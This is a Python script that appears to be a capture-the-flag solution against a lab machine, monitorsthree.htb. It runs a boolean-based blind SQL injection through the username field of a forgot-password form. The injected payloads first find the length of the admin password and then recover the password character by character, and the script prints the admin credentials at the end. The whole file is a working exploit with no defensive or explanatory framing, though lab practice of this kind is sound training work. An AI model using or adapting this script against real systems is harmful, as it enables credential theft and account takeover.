import requests
import string

# Define the URL to send the POST request to
url = "http://monitorsthree.htb/forgot_password.php"

charset = ""
charset += string.ascii_lowercase  # 'abcdefghijklmnopqrstuvwxyz'
charset += string.ascii_uppercase  # 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
charset += string.digits  # '0123456789'
charset += string.punctuation  # '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'

def sendRequest(url, data):
    try:
        # Send the POST request with the data
        response = requests.post(url, data=data)
        
        # Print the response URL (after redirection, if any)
        #print("Final URL after redirection:", response.url)
        
        # Print the response status code to verify the request
        #print("Response status code:", response.status_code)
        
        # Print the response content
        #print("Response content:")
        #print(response.text)

        return response

    except requests.exceptions.RequestException as e:
        # Handle any request exceptions
        print(f"An error occurred: {e}")


def main():
    length = 0
    password = ""
    
    # find password length
    for i in range (0, 100):
        username = f"user' or (select count(*) from users where username='admin' and length(password) = {i}) > 0 -- -"
        data = {'username': username}
        
        response = sendRequest(url, data)
        if "Successfully" in response.text:
            length = i
            break

    print(f"length={length}")

    # find password
    for i in range (0, length):
        for char in charset:
            print(password+char, end="\r")
            username = f"user' or (select count(*) from users where username='admin' and password like '{password}{char}%' ) > 0 -- -"
            data = {'username': username}

            response = sendRequest(url, data)
            if "Successfully" in response.text:
                password += char
                break
    
    print(f"admin:{password}")


main()
